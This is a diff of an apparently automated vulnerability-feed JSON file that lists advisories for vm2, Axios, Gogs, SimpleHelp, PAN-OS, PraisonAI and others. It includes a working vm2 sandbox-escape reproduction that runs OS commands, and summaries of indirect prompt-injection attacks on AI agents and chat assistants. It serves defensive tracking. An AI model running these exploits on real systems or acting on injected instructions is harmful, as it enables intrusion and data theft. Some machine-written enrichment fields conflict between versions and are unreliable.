@@ -1,8 +1,8 @@
 {
-  "generated": "2026-05-30T13:01:08.332227+00:00",
-  "total": 52,
+  "generated": "2026-05-30T19:00:59.358167+00:00",
+  "total": 37,
   "kev": 0,
-  "zero_day": 15,
+  "zero_day": 10,
   "enriched": 10,
   "findings": [
     {
@@ -22,73 +22,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "CVE-2024-57727 is a path traversal vulnerability that permits unauthenticated remote attackers to read arbitrary files (e.g., logs, configuration files, credentials) from the SimpleHelp server, facilitating further compromise.",
-        "affected_products": "SimpleHelp Remote Support / RMM versions 5.5.7 and earlier",
+        "technical_details": "Multiple unauthenticated path traversal (directory traversal) vulnerabilities in SimpleHelp <=5.5.7 allow attackers to retrieve arbitrary files (logs, configuration files, credentials), enabling further compromise and account takeover.",
+        "affected_products": "SimpleHelp remote support software v5.5.7 and earlier",
         "cvss_score": "7.5",
-        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         "exploit_available": "true",
         "patch_available": "true",
         "active_exploitation": "true",
-        "threat_actors": "DragonForce and other ransomware actors",
-        "mitigation": "Apply the vendor update to 5.5.8 or later immediately; if patching is not possible, isolate SimpleHelp servers from the internet, restrict access via firewall to trusted IPs, disable remote access, rotate credentials, and review logs and indicators of compromise per CISA guidance.",
+        "threat_actors": "DragonForce ransomware actors",
+        "mitigation": "Upgrade SimpleHelp to version 5.5.8 immediately. If patching is delayed, restrict network access to SimpleHelp (block external access, allow only trusted management networks), implement firewall rules and VPN access, rotate any credentials discovered on affected systems, monitor logs for suspicious file access, and isolate compromised hosts. Follow additional mitigation guidance from the CISA advisory.",
         "vendor_advisory": "https://simple-help.com/blogs/security-vulnerabilities-in-simplehelp-5-5-7-and-earlier-what-you-need-to-know"
-      }
-    },
-    {
-      "id": "CVE-2026-47137",
-      "title": "vm2 has a CVE-2023-37903 patch bypass: nesting:true without explicit require still allows full RCE",
-      "summary": "## Summary\n\nThe fix for GHSA-8hg8-63c5-gwmx (CVE-2023-37903) introduced a check in `nodevm.js` line 263 that blocks the combination `nesting: true` + `require: false`. However, the check uses strict equality (`options.require === false`), which is trivially bypassed by omitting the `require` option entirely.\n\nWhen `require` is not specified, `options.require` is `undefined`, not `false`. The strict equality check fails, so the security guard is skipped. Immediately after (line 280), the destructuring default `require: requireOpts = false` assigns `requireOpts = false`, producing the exact configuration the patch was designed to prevent.\n\n## Root Cause\n\n```javascript\n// nodevm.js:263 \u2014 the security check\nif (options.nesting === true && options.require === false) {\n    throw new VMError('...');\n}\n// nodevm.js:280 \u2014 the default assignment (AFTER the check)\nconst { require: requireOpts = false } = options;\n// When options.require is undefined:\n//   - Line 263: undefined === false \u2192 FALSE \u2192 check skipped\n//   - Line 280: requireOpts = false \u2192 same as require:false\n```\n\n## Impact\n\nFull Remote Code Execution on the host system. An attacker running code inside a `NodeVM({ nesting: true })` sandbox (without specifying `require`) can:\n\n1. `require('vm2')` to get the vm2 library\n2. Construct an inner `NodeVM` with `require: { builtin: ['child_process'] }`\n3. Execute arbitrary OS commands via `child_process.execSync`\n\nThe inner VM is completely unconstrained by the outer sandbox configuration.\n\n## Reproduction\n\n```javascript\nconst { NodeVM } = require('vm2');\n\n// nesting:true, require not specified (defaults to false AFTER the check)\nconst nvm = new NodeVM({ nesting: true });\n\nconst result = nvm.run(`\n  const { NodeVM } = require('vm2');\n  const inner = new NodeVM({\n    require: { builtin: ['child_process'] }\n  });\n  module.exports = inner.run(\n    \"module.exports = require('child_process').execSync('id').toString()\",\n    'exploit.js'\n  );\n`, 'exploit.js');\n\nconsole.log(result)",
-      "link": "https://github.com/advisories/GHSA-m4wx-m65x-ghrr",
-      "published": "2026-05-29T17:50:22Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47137"
-      ],
-      "is_zero_day": true,
-      "is_high_severity": true,
-      "enrichment": {
-        "technical_details": "The fix for GHSA-8hg8-63c5-gwmx (CVE-2023-37903) added a guard that blocked the combination nesting: true with require: false using a strict equality check (options.require === false). When callers omit the require option, options.require is undefined so the guard is bypassed; later destructuring sets requireOpts to false as a default, restoring the insecure configuration and enabling sandbox escape leading to RCE.",
-        "affected_products": "vm2 npm package \u2014 affected versions up through 3.10.4 (3.10.5 is non-vulnerable per vendor advisories).",
-        "cvss_score": "CVSS score unavailable.",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "true \u2014 public PoC/technical writeups describing sandbox escape and RCE (see BleepingComputer and technical writeups).",
-        "patch_available": "true \u2014 vendor released patched versions (3.10.5) and GHSA advisory (see references).",
-        "active_exploitation": "false \u2014 Active exploitation status unknown.",
-        "threat_actors": "None known.",
-        "mitigation": "Upgrade vm2 to fixed version (>=3.10.5). As a workaround, avoid using nesting:true or ensure require is explicitly set to false when creating NodeVM; run untrusted code in isolated processes; apply defense-in-depth (process-level sandboxing, least privilege).",
-        "vendor_advisory": "Vendor advisory URL unavailable."
-      }
-    },
-    {
-      "id": "https://www.securityweek.com/gogs-zero-day-exposes-servers-to-remote-code-execution/",
-      "title": "Gogs Zero-Day Exposes Servers to Remote Code Execution",
-      "summary": "The critical-severity issue, assigned a CVSS score of 9.4, is an argument injection flaw that can be exploited by authenticated attackers via pull requests with malicious branch names. The post Gogs Zero-Day Exposes Servers to Remote Code Execution appeared first on SecurityWeek .",
-      "link": "https://www.securityweek.com/gogs-zero-day-exposes-servers-to-remote-code-execution/",
-      "published": "2026-05-29T12:59:37+00:00",
-      "source": "SecurityWeek",
-      "tags": [
-        "news",
-        "research"
-      ],
-      "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": true,
-      "enrichment": {
-        "technical_details": "An argument\u2011injection and path\u2011traversal flaw (CVE\u20112025\u20118110) in Gogs' repository file\u2011editing feature allows authenticated attackers to craft pull requests with malicious branch names or use symbolic links, leading to file overwrite outside the repository and remote code execution.",
-        "affected_products": "Gogs (self\u2011hosted Git service) \u2013 versions vulnerable (CVE\u20112025\u20118110)",
-        "cvss_score": "9.4",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "true \u2013 https://github.com/zAbuQasem/gogs-CVE-2025-8110, https://wiz.io/blog/wiz-research-gogs-cve-2025-8110-rce-exploit",
-        "patch_available": "false",
-        "active_exploitation": "true",
-        "threat_actors": "None known",
-        "mitigation": "Immediately restrict access to Internet\u2011facing Gogs instances (take offline or block access), enforce network\u2011level restrictions, disable file\u2011editing or pull\u2011request handling where possible, rotate credentials and SSH keys on compromised hosts, and monitor for indicators of compromise. Apply a vendor patch when one becomes available.",
-        "vendor_advisory": "Vendor advisory URL unavailable."
       }
     },
     {
@@ -107,16 +50,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Indirect Prompt Injection (IPI) occurs when AI systems process untrusted content (webpages, emails, documents) containing malicious instructions; when the AI ingests that content it can follow attacker commands (data exfiltration, destructive actions, SEO manipulation, behavior changes).",
-        "affected_products": "Affected products unavailable.",
-        "cvss_score": "CVSS score unavailable.",
-        "cvss_vector": "CVSS vector unavailable.",
+        "technical_details": "Indirect Prompt Injection (IPI) uses hidden or untrusted web content (e.g., hidden HTML, third\u2011party scripts, persistent memory in AI agents) to insert instructions that influence AI assistant behavior, enabling data exfiltration, fraud, or code execution when an agent incorporates that content into prompts.",
+        "affected_products": "Affected products unavailable",
+        "cvss_score": "CVSS score unavailable",
+        "cvss_vector": "CVSS vector unavailable",
         "exploit_available": "false",
-        "patch_available": "false",
+        "patch_available": "true",
         "active_exploitation": "true",
         "threat_actors": "None known",
-        "mitigation": "Layered defenses and hardening recommended by Google: coarse-to-fine filtering of content, red\u2011team testing of models (e.g., Gemini), product\u2011level safeguards (e.g., Workspace mitigations), and participation in AI Vulnerability Reward Program; general advice: treat web content as untrusted, apply input sanitation/filters, limit agentic actions and privileges, and monitor for anomalous behavior.",
-        "vendor_advisory": "https://blog.google/security/prompt-injections-web/"
+        "mitigation": "Harden agent input handling\u2014sanitize and validate web\u2011sourced content, restrict parsing of hidden DOM elements and scripts, apply provenance checks, disable automatic execution of untrusted content, implement rate\u2011limiting and monitoring for anomalous agent behavior.",
+        "vendor_advisory": "http://security.googleblog.com/2026/04/ai-threats-in-wild-current-state-of.html"
       }
     },
     {
@@ -135,16 +78,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Indirect prompt injection (IPI) is an attack technique where adversaries inject malicious instructions into data sources or tools an LLM uses when fulfilling a user query, causing the model or agentic automation to behave in attacker\u2011controlled ways even without direct user input.",
-        "affected_products": "Google Workspace with Gemini",
-        "cvss_score": "CVSS score unavailable",
-        "cvss_vector": "CVSS vector unavailable",
+        "technical_details": "Indirect prompt injection (IPI) is a threat where attacker\u2011supplied instructions are injected into data or tools consumed by an LLM (e.g., files, connectors, web content) causing the model to follow malicious instructions when completing the user query. IPI can occur without direct user input and is mitigated via layered defenses including sanitization, provenance, and model instruction controls.",
+        "affected_products": "Affected products unavailable.",
+        "cvss_score": "CVSS score unavailable.",
+        "cvss_vector": "CVSS vector unavailable.",
         "exploit_available": "false",
-        "patch_available": "false",
+        "patch_available": "Patch availability unknown.",
         "active_exploitation": "true",
         "threat_actors": "None known",
-        "mitigation": "Google\u2011recommended layered defenses: input/data provenance and integrity checks, content filtering/sanitization, prompt and tool hardening (explicit instructions to ignore untrusted data), model response sanitization and rejection policies, monitoring and telemetry, and continual updates to detection rules.",
-        "vendor_advisory": "http://security.googleblog.com/2026/04/google-workspaces-continuous-approach.html"
+        "mitigation": "Use layered defenses: data filtering and sanitization of external sources, provenance tracking, tool/output validation, model-level instruction filtering and policy enforcement, continuous monitoring and threat intelligence sharing.",
+        "vendor_advisory": "http://blog.google/security/google-workspaces-continuous-approach-to-mitigating-indirect-prompt-injections"
       }
     },
     {
@@ -163,16 +106,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "The primary new threat is indirect prompt injection, where malicious web content can manipulate the agent's prompts to trigger unintended actions. Google proposes layered defenses such as prompt\u2011injection blocking, origin\u2011restricted access, and runtime safety checks.",
-        "affected_products": "Chrome (agentic/Gemini integration)",
+        "technical_details": "Indirect prompt injection embeds hidden or manipulated instructions in web content that are later ingested by the LLM agent, causing it to perform unwanted actions such as unauthorized transactions or data exfiltration. CVE\u20112026\u20110628 is a privilege\u2011escalation flaw in Chrome's Gemini integration that lets a malicious extension bypass user consent, read local files, capture media, and execute arbitrary commands within the browser environment.",
+        "affected_products": "Google Chrome (agentic capabilities / Gemini feature)",
         "cvss_score": "CVSS score unavailable.",
         "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "false",
-        "patch_available": "true \u2014 https://blog.google/security/architecting-security-for-agentic/",
-        "active_exploitation": "false",
+        "exploit_available": "true",
+        "patch_available": "true",
+        "active_exploitation": "true",
         "threat_actors": "None known",
-        "mitigation": "Use the latest Chrome with agentic capabilities disabled until patches/controls are available; enforce origin restrictions and follow Google\u2019s guidance in the advisory.",
-        "vendor_advisory": "https://blog.google/security/architecting-security-for-agentic/"
+        "mitigation": "Enable Chrome's built\u2011in prompt\u2011injection classifier, keep Chrome (including the Gemini/agentic component) up\u2011to\u2011date with the January\u202f2026 patch, restrict third\u2011party extensions, and apply network\u2011level filtering to block malicious web content that could deliver indirect prompt injections.",
+        "vendor_advisory": "http://security.googleblog.com/2025/12/architecting-security-for-agentic.html"
       }
     },
     {
@@ -191,16 +134,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Technical details unavailable.",
-        "affected_products": "Affected products unavailable.",
-        "cvss_score": "CVSS score unavailable.",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "Exploit availability unknown.",
-        "patch_available": "Patch availability unknown.",
-        "active_exploitation": "Active exploitation status unknown.",
-        "threat_actors": "None known.",
-        "mitigation": "Mitigation steps unavailable.",
-        "vendor_advisory": "Vendor advisory URL unavailable."
+        "technical_details": "Adopting Rust in Android reduces memory\u2011safety vulnerabilities (use\u2011after\u2011free, buffer overflows, etc.) by shifting new code to a memory\u2011safe language, resulting in memory\u2011safety bugs falling below 20% of total vulnerabilities in 2025.",
+        "affected_products": "Android platform (first\u2011party and third\u2011party/open\u2011source components across C, C++, Java, Kotlin, and Rust) \u2014 2025 coverage",
+        "cvss_score": "CVSS score unavailable",
+        "cvss_vector": "CVSS vector unavailable",
+        "exploit_available": "false",
+        "patch_available": "true \u2014 http://security.googleblog.com/2025/11/rust-in-android-move-fast-fix-things.html",
+        "active_exploitation": "false",
+        "threat_actors": "None known",
+        "mitigation": "Continue migrating new native components to Rust, apply standard hardening (least privilege, sandboxing), keep platform updates applied; for C/C++ components use ASLR, stack canaries, bounds\u2011checking tools, sanitizer builds, and timely patching.",
+        "vendor_advisory": "http://security.googleblog.com/2025/11/rust-in-android-move-fast-fix-things.html"
       }
     },
     {
@@ -219,16 +162,16 @@
       "is_zero_day": true,
       "is_high_severity": true,
       "enrichment": {
-        "technical_details": "Indirect prompt injection (IPI) embeds malicious instructions in external data sources (emails, documents, calendar invites, web content, HTML comments, image metadata, URLs) which LLMs may execute or use to exfiltrate data; attack mechanisms include concealed payloads (CSS/HTML comments), URL\u2011based exfiltration, image\u2011based \"EchoLeak\" rendering, and agentic tool\u2011chaining that leverages saved credentials.",
-        "affected_products": "Gemini (Google Workspace, Gemini app) version 2.5",
+        "technical_details": "Indirect prompt injections involve hidden malicious instructions placed in external data sources such as websites, emails, documents, or calendar invites. When an LLM processes this content, the concealed commands are executed, allowing attackers to influence the model\u2019s behavior without a direct prompt.",
+        "affected_products": "Microsoft Copilot Studio",
         "cvss_score": "CVSS score unavailable.",
         "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "false",
-        "patch_available": "false",
-        "active_exploitation": "true",
+        "exploit_available": "Exploit availability unknown.",
+        "patch_available": "Patch availability unknown.",
+        "active_exploitation": "Active exploitation status unknown.",
         "threat_actors": "None known",
-        "mitigation": "Layered defenses \u2013 Gemini 2.5 model hardening, purpose\u2011built ML detectors for malicious instructions, markdown sanitization and external image URL blocking, suspicious URL detection using Google Safe Browsing, deterministic defenses (user confirmation, URL sanitization, tool\u2011chaining policies governed by a Policy Engine), synthetic\u2011data retraining, adversarial red\u2011teaming, Google AI VRP, and centralized policy/config updates for rapid fixes.",
-        "vendor_advisory": "http://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html"
+        "mitigation": "Adopt a layered defense strategy: sanitize and validate all inputs, verify the provenance of external data, enforce context checks before feeding data to LLMs, filter model outputs for suspicious commands, and continuously monitor interactions for anomalous behavior.",
+        "vendor_advisory": "Vendor advisory URL unavailable."
       }
     },
     {
@@ -246,15 +189,15 @@
       "is_zero_day": true,
       "is_high_severity": false,
       "enrichment": {
-        "technical_details": "Actors compromise large backbone, provider edge (PE), and customer edge (CE) routers, modify router firmware or configuration, and leverage compromised devices and trusted connections to pivot and sustain persistent access to networks.",
-        "affected_products": "Backbone, provider edge (PE), and customer edge (CE) routers from various vendors (e.g., Cisco, Palo Alto)",
-        "cvss_score": "CVSS score unavailable.",
-        "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "Exploit availability unknown.",
-        "patch_available": "Patch availability unknown.",
+        "technical_details": "Actors target large backbone routers (including PE and CE routers) and leverage compromised devices and trusted connections to pivot; they modify routers to maintain persistent, long-term access to networks",
+        "affected_products": "Affected products unavailable",
+        "cvss_score": "CVSS score unavailable",
+        "cvss_vector": "CVSS vector unavailable",
+        "exploit_available": "Exploit availability unknown",
+        "patch_available": "Patch availability unknown",
         "active_exploitation": "true",
-        "threat_actors": "Salt Typhoon, OPERATOR PANDA, RedMike, UNC5807, GhostEmperor",
-        "mitigation": "Network segmentation, hardening routers, monitoring configuration changes, rotating credentials and keys, and applying vendor fixes where available.",
+        "threat_actors": "Salt Typhoon; OPERATOR PANDA; RedMike; UNC5807; GhostEmperor",
+        "mitigation": "Key mitigations per advisory: monitor and harden backbone, provider edge (PE) and customer edge (CE) routers; restrict and monitor trusted network connections; detect and remediate router modifications that enable persistence; follow CISA/National Security Agency mitigation guidance",
         "vendor_advisory": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a"
       }
     },
@@ -273,15 +216,15 @@
       "is_zero_day": true,
       "is_high_severity": false,
       "enrichment": {
-        "technical_details": "The campaign used GRU espionage tradecraft \u2014 phishing/spearphishing, credential theft, and deployment of malware for initial access, persistence, lateral movement, and data exfiltration; TTPs and IOCs are enumerated in the joint CSA.",
-        "affected_products": "Affected products unavailable.",
+        "technical_details": "The campaign exploits multiple known flaws: CVE-2023-23397 in Microsoft Outlook allows remote code execution via crafted NTLM authentication requests; CVE-2023-38831 in WinRAR enables arbitrary code execution when a malicious RAR archive is opened; and several Roundcube webmail vulnerabilities (CVE-2020-12641, CVE-2020-35730, CVE-2021-44026) permit credential theft and cross\u2011site scripting. Attackers chain these flaws to gain initial access and move laterally within target networks.",
+        "affected_products": "Microsoft Outlook (CVE-2023-23397), WinRAR (CVE-2023-38831), Roundcube (CVE-2020-12641, CVE-2020-35730, CVE-2021-44026)",
         "cvss_score": "CVSS score unavailable.",
         "cvss_vector": "CVSS vector unavailable.",
-        "exploit_available": "false",
-        "patch_available": "false",
+        "exploit_available": "Exploit availability unknown.",
+        "patch_available": "true",
         "active_exploitation": "true",
-        "threat_actors": "Russian GRU Unit 26165 (85th GTsSS), tracked as APT28",
-        "mitigation": "Apply advisory hardening and TTP mitigations: implement MFA, network segmentation, deploy EDR/logging, apply least privilege, hunt using provided IOCs and Yara/signature guidance, patch external\u2011facing systems, restrict RDP/VPN, review supply chain and remote access configurations.",
+        "threat_actors": "APT28, Fancy Bear, Forest Blizzard, Blue Delta",
+        "mitigation": "Segment networks, enforce MFA, apply all vendor\u2011released patches (e.g., Outlook, WinRAR, Roundcube), update firmware on IP cameras, disable unnecessary remote access to cameras, and ensure IP cameras are supported. Also employ strong password policies and monitor for IOCs such as Certipy, Get\u2011GPPPassword.py, and ldap\u2011dump.py.",
         "vendor_advisory": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a"
       }
     },
@@ -300,7 +243,19 @@
         "CVE-2026-0257"
       ],
       "is_zero_day": true,
-      "is_high_severity": false
+      "is_high_severity": false,
+      "enrichment": {
+        "technical_details": "Authentication bypass in GlobalProtect portal and gateway allowing unauthorized VPN establishment by an attacker exploiting flawed authentication handling.",
+        "affected_products": "PAN\u2011OS (GlobalProtect portal and gateway)",
+        "cvss_score": "7.8",
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+        "exploit_available": "true",
+        "patch_available": "true",
+        "active_exploitation": "true",
+        "threat_actors": "None known",
+        "mitigation": "Apply vendor\u2011provided patches/updates immediately; if patching is delayed, disable GlobalProtect portal/gateway where feasible, restrict administrative access, implement compensating access controls and monitoring as listed in the advisory.",
+        "vendor_advisory": "https://security.paloaltonetworks.com/CVE-2026-0257"
+      }
     },
     {
       "id": "CVE-2026-47398",
@@ -318,55 +273,19 @@
         "CVE-2026-47398"
       ],
       "is_zero_day": true,
-      "is_high_severity": false
-    },
-    {
-      "id": "https://thehackernews.com/2026/05/chatgphish-vulnerability-turns-chatgpt.html",
-      "title": "ChatGPhish Vulnerability Turns ChatGPT Web Summaries Into a Phishing Surface",
-      "summary": "Cybersecurity researchers have disclosed details of a vulnerability in OpenAI ChatGPT that leverages the artificial intelligence (AI) assistant's implicit trust in Markdown links and images to trigger prompt injections and open the door to phishing attacks.\n\nThe technique has been codenamed ChatGPhish by Permiso Security.\n\n\"The chatgpt.com response renderer trusts Markdown links and Markdown",
-      "link": "https://thehackernews.com/2026/05/chatgphish-vulnerability-turns-chatgpt.html",
-      "published": "2026-05-29T18:07:12+00:00",
-      "source": "The Hacker News Security",
-      "tags": [
-        "news",
-        "zeroday"
-      ],
-      "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": false
-    },
-    {
-      "id": "CVE-2026-44489",
-      "title": "Axios has a Patch Bypass: Proxy-Authorization Header Injection via Prototype Pollution \u2014 Incomplete Null-Prototype Fix",
-      "summary": "# [Patch Bypass] Proxy-Authorization Header Injection via Prototype Pollution \u2014 Incomplete Null-Prototype Fix in Axios 1.15.2\n\n## Summary\n\nThe `Object.create(null)` fix introduced in Axios 1.15.2 (GHSA-q8qp-cvcw-x6jj) protects the **top-level config object** from prototype pollution. However, **nested objects** created by `utils.merge()` (e.g., `config.proxy`) are still constructed as plain `{}` with `Object.prototype` in their chain.\n\nThe `setProxy()` function at `lib/adapters/http.js:209-223` reads `proxy.username`, `proxy.password`, and `proxy.auth` **without `hasOwnProperty` checks**. When `Object.prototype.username` is polluted, `setProxy()` constructs a `Proxy-Authorization` header with attacker-controlled credentials and injects it into **every proxied HTTP request**.\n\n**Severity:** Medium (CVSS 5.4)\n**Affected Versions:** 1.15.2 (and potentially 1.15.1)\n**Vulnerable Component:** `lib/adapters/http.js` (`setProxy()`) + `lib/utils.js` (`merge()`)\n\n## CWE\n\n- **CWE-1321:** Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')\n- **CWE-113:** Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')\n\n## CVSS 3.1\n\n**Score: 5.6 (Medium)**\n\nVector: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L`\n\n| Metric | Value | Justification |\n|---|---|---|\n| Attack Vector | Network | PP triggered remotely via vulnerable dependency |\n| Attack Complexity | **High** | Requires **two** preconditions: (1) PP in dependency tree, AND (2) the application must explicitly configure `config.proxy`. Unlike GHSA-q8qp-cvcw-x6jj which affected all requests unconditionally |\n| Privileges Required | None | No authentication needed |\n| User Interaction | None | No user interaction required |\n| Scope | Unchanged | Within the proxy authentication context |\n| Confidentiality | **Low** | Attacker-controlled identity appears in proxy authentication logs, but the attacker does NOT see request/response data (unlike `config.baseURL` hijack) |",
-      "link": "https://github.com/advisories/GHSA-654m-c8p4-x5fp",
-      "published": "2026-05-29T15:51:02Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-44489"
-      ],
-      "is_zero_day": true,
-      "is_high_severity": false
-    },
-    {
-      "id": "https://therecord.media/microsoft-calls-zero-day-releases-never-justifiable-as-researcher-threatens-more",
-      "title": "Microsoft calls zero-day releases \u2018never justifiable\u2019 as researcher threatens to drop more",
-      "summary": "Each vulnerability was published with working proof-of-concept code to the Microsoft-owned code repository GitHub, making them immediately available to both attackers and security professionals.",
-      "link": "https://therecord.media/microsoft-calls-zero-day-releases-never-justifiable-as-researcher-threatens-more",
-      "published": "2026-05-29T13:33:00+00:00",
-      "source": "The Record by Recorded Future",
-      "tags": [
-        "news",
-        "threat-intel"
-      ],
-      "cve_ids": [],
-      "is_zero_day": true,
-      "is_high_severity": false
+      "is_high_severity": false,
+      "enrichment": {
+        "technical_details": "Two unguarded `spec.loader.exec_module` calls in `praisonai/agents_generator.py` (functions `load_tools_from_module` and `load_tools_from_module_class`) load modules specified by `module_path` from `agents.yaml` without the `PRAISONAI_ALLOW_LOCAL_TOOLS` gate or any path validation, enabling remote code execution when an attacker controls the module path.",
+        "affected_products": "PraisonAI (pip) versions >= 2.0.0, <= 4.6.39",
+        "cvss_score": "7.8",
+        "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+        "exploit_available": "true",
+        "patch_available": "true",
+        "active_exploitation": "false",
+        "threat_actors": "None known",
+        "mitigation": "Set PRAISONAI_ALLOW_LOCAL_TOOLS=\"true\" only when safe; apply strict allowlist validation of module_path; upgrade to patched version 4.6.40; disable network\u2011reachable recipe server defaults (avoid allow_any_github=True) and restrict writable/shared config directories.",
+        "vendor_advisory": "https://github.com/advisories/GHSA-78r8-wwqv-r299"
+      }
     },
     {
       "id": "CVE-2026-47416",
@@ -834,186 +753,6 @@
       ],
       "cve_ids": [
         "CVE-2026-46690"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47190",
-      "title": "IPAM controller service account granted unnecessary full access to Secrets",
-      "summary": "### Impact\n\nIPAM is the IP address Manager for Cluster API Provider Metal3. The IPAM controller's ClusterRole granted full CRUD permissions (create, delete, get, list, patch, update, watch) on core/v1 Secrets. The controller never accesses Secrets during normal operation. If the controller pod were compromised (e.g. via supply chain attack or container escape), an attacker could leverage these excessive  permissions to read, modify, or delete Secrets in the namespace, potentially exposing credentials and other sensitive data.\n\nAll users running ip-address-manager versions prior to the patched releases are affected.\n\n### Patches\n\nFixed in:\n- v1.11.7\n- v1.12.4\n- v1.13.0\n\nUsers should upgrade to the patched version for their release branch.\n\n### Workarounds\n\nManually remove the Secrets resource entry from the metal3-ipam-controller-manager-role ClusterRole:\n\n```yaml\n# Remove this entire block from the ClusterRole\n- apiGroups:\n  - \"\"\n  resources:\n  - secrets\n  verbs:\n  - create\n  - delete\n  - get\n  - list\n  - patch\n  - update\n  - watch\n```\n\n### Resources\n\n- https://github.com/metal3-io/ip-address-manager/pull/1355\n- https://github.com/metal3-io/ip-address-manager/pull/1356 (backport to release-1.12)\n- https://github.com/metal3-io/ip-address-manager/pull/1357 (backport to release-1.11)",
-      "link": "https://github.com/advisories/GHSA-49pm-43hf-6xfq",
-      "published": "2026-05-29T18:24:45Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47190"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47141",
-      "title": "NodeVM observability builtins leak host process and HTTP request data",
-      "summary": "## Summary\n\n`NodeVM` exposes some process-wide observability builtins when they are allowed through `require.builtin`.\n\nThe following builtins are not blocked by the dangerous builtin denylist:\n\n```text\ndiagnostics_channel\nasync_hooks\nperf_hooks\n```\n\nThese modules are process-wide, not sandbox-local. Sandboxed code can use them to observe host application data across the vm2 boundary.\n\n**Note**: It is a host data exposure issue. The impact depends on whether the host application allows these builtins and uses HTTP, async request context, diagnostics channels, or performance marks in the same process.\n\n## Details\n\nNon-denied builtins are exposed to the sandbox through `lib/builtin.js`:\n\n```js\nbuiltins.set(key, special ? special : vm => vm.readonly(hostRequire(key)));\n```\n\n`diagnostics_channel`, `async_hooks`, and `perf_hooks` are not denied. These modules expose host process state rather than sandbox-local state.\n\nConfirmed examples:\n\n1. `diagnostics_channel` lets sandboxed code subscribe to Node.js HTTP diagnostic channels such as `http.server.request.start`. The sandbox receives host HTTP request objects and can read headers such as `Authorization` or session tokens.\n2. `async_hooks.executionAsyncResource()` lets sandboxed code read the current host `AsyncResource`. If the host stores request/user data on that resource, the sandbox can read it.\n3. `perf_hooks.performance.getEntriesByType('mark')` lets sandboxed code read host performance timeline entries.\n\n## PoC\n\nRun from the vm2 repository root:\n\n```bash\nnode poc/observability-builtins-info-leak.js\n```\n[observability-builtins-info-leak.js](https://github.com/user-attachments/files/27571259/observability-builtins-info-leak.js)\n\nThe PoC uses only the specific builtin being tested in each section.\n\nIt confirms:\n\n```text\ndiagnostics_channel: sandbox reads host HTTP request headers\nasync_hooks: sandbox reads host AsyncResource data\nperf_hooks: sandbox reads host performance mark names\n```\n\nExample impact from the PoC:",
-      "link": "https://github.com/advisories/GHSA-9g8x-92q2-p28f",
-      "published": "2026-05-29T18:20:45Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47141"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47139",
-      "title": "NodeVM network builtin exclusions bypass via internal _http_client and _http_server",
-      "summary": "## Summary\n\n`NodeVM` supports excluding public network builtins from the wildcard builtin option. With this configuration direct access to `http`, `https`, `http2`, `net`, `dgram`, `tls`, `dns`, and `dns/promises` is blocked.\n\nHowever, Node.js also exposes underscored internal HTTP builtins such as `_http_client` and `_http_server`. These are not blocked when the public modules are excluded.\n\nSandboxed code can use these internal builtins to make outbound HTTP requests and open listening HTTP sockets even though the public network modules are denied.\n\n**Note**: This is not host RCE. It is a network capability bypass that can lead to SSRF-style access to internal services.\n\n## Details\n\nThe wildcard builtin expansion is based on Node.js builtin module names:\n\n```js\nconst BUILTIN_MODULES = (nmod.builtinModules || Object.getOwnPropertyNames(process.binding('natives')))\n  .filter(s=>!s.startsWith('internal/') && !DANGEROUS_BUILTINS.has(s));\n```\n\nPublic modules can be excluded with `-name`:\n\n```js\nif (builtins.indexOf(`-${name}`) === -1) {\n  addDefaultBuiltin(res, name, hostRequire);\n}\n```\n\nBut excluding `http` and `net` does not exclude internal siblings such as:\n\n```text\n_http_client\n_http_server\n_tls_wrap\n```\n\nThese internal modules expose network primitives.\n\nConfirmed examples:\n\n1. `require('_http_client').ClientRequest(...)` performs an outbound HTTP request to a host-local service while `http` and `net` are blocked.\n2. `require('_http_server').Server(...).listen(...)` opens a listening HTTP socket while `http` and `net` are blocked.\n\n## PoC\n\nTested on:\n\n```text\nvm2: 3.11.2\nNode.js: v25.9.0\n```\n\nRun from the vm2 repository root:\n\n```bash\nnode poc/internal-http-builtin-network-bypass.js\n```\n[internal-http-builtin-network-bypass.js](https://github.com/user-attachments/files/27571182/internal-http-builtin-network-bypass.js)\n\n\nThe PoC first 